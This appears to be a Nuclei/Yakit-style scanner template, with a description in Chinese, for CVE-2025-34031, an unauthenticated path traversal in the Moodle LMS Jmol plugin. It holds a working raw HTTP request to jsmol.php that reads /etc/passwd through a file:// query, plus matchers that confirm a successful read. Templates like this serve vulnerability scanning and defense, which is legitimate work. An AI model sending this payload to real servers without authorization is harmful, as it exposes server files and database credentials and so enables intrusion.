script_name: Moodle LMS Jmol插件路径遍历漏洞
content:
id: CVE-2025-34031

info:
  name: Moodle LMS Jmol插件路径遍历漏洞
  author: Deans
  severity: high
  description: Moodle LMS的Jmol插件在6.1及之前版本中存在路径遍历漏洞，该漏洞通过jsmol.php中的查询参数触发。该脚本未经过适当验证，直接将用户输入传递给file_get_contents()函数，从而允许攻击者通过构造恶意查询值读取服务器文件系统中的任意文件。此漏洞无需身份验证即可被利用，可能导致敏感配置数据（包括数据库凭证）泄露。
  reference:
  - https://github.com/
  - https://cve.mitre.org/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: 5827cb4eae802e19b1dc9b2776160e9a

http:
- raw:
  - |+
    @timeout: 30s
    GET /filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&query=file:///etc/passwd HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
    Accept-Language: en-US,en;q=0.5


  max-redirects: 3
  disable-cookie: true
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - /bin/bash
    - 'root:x:'
    condition: and
